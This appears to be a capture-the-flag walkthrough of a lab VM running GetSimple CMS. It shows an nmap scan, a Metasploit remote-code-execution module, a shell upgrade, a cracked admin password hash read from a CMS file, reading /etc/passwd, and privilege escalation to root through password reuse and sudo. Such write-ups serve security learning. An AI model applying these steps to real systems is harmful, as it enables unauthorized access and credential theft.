# Simple Walkthrough

## Enumeration

Let's start with a nmap scan

```
┌──(deathflash㉿kali)-[~/simple-vvm]
└─$ nmap -sC -sV -oN scan.txt 192.168.70.130
Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-16 02:48 EDT
Nmap scan report for 192.168.70.130
Host is up (0.0010s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 42:da:1f:3c:be:8b:ed:1a:8e:11:be:1a:bb:7b:52:db (RSA)
|   256 7d:a2:5f:13:9f:72:1d:d7:a3:77:04:19:d5:df:06:7e (ECDSA)
|_  256 f4:b6:d6:9b:3d:72:aa:de:43:ea:e2:96:76:d4:06:0a (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/admin/
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Welcome to GetSimple! - Simple
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.47 seconds
```

We see only two ports open SSH (22) and HTTP (80)

GetSimpleCMS is running on port 80

![](https://i.imgur.com/8UgBHtt.png)

## Exploitation

Searching for exploits with `searchsploit`

![](https://i.imgur.com/x885tSl.png)

Let's use Metasploit's Unauthenticated Remote Code Execution module

`set rhosts <target-ip>`

![](https://i.imgur.com/Il0sI4I.png)

We have code execution as `www-data`

```
meterpreter > shell
Process 2201 created.
Channel 2 created.
python3 -c 'import pty;pty.spawn("/bin/bash");'
www-data@simple:/var/www/html/theme$
```

## Escalation

Directory enumeration reveals a username admin and password hash in `/var/www/html/data/users/admin.xml`

```xml
meterpreter > cat /var/www/html/data/users/admin.xml
<?xml version="1.0"?>
<item><USR>admin</USR><PWD>c5a6f585d187b5f906d5d442e1673cb2af04316c</PWD><EMAIL>9tfx@deathflash.in</EMAIL><HTMLEDITOR>1</HTMLEDITOR><TIMEZONE/><LANG>en_US</LANG></item>
```

Crack the password hash with `john`

![](https://i.imgur.com/EEh8d7E.png)

Check the available users on the machine

```
www-data@simple:/var/www/html/theme$ cat /etc/passwd | grep sh
cat /etc/passwd | grep sh
root:x:0:0:root:/root:/bin/bash
simple:x:1001:1001::/home/simple:/bin/sh
www-data@simple:/var/www/html/theme$

www-data@simple:/var/www/html/theme$ ls -l /home                 
ls -l /home
total 8
drwxr-xr-x 2 simple  simple  4096 Jun 16 06:31 simple
```

We see a user called `simple`  let's try the password `simple1` 

![](https://i.imgur.com/IUJuxow.png)

The user is part of `sudo` group leading to code execution as `root`

![](https://i.imgur.com/wLy8eWC.png)

## References

- [GetSimple CMS v3.3.16 - Remote Code Execution (RCE)](https://www.exploit-db.com/exploits/51475)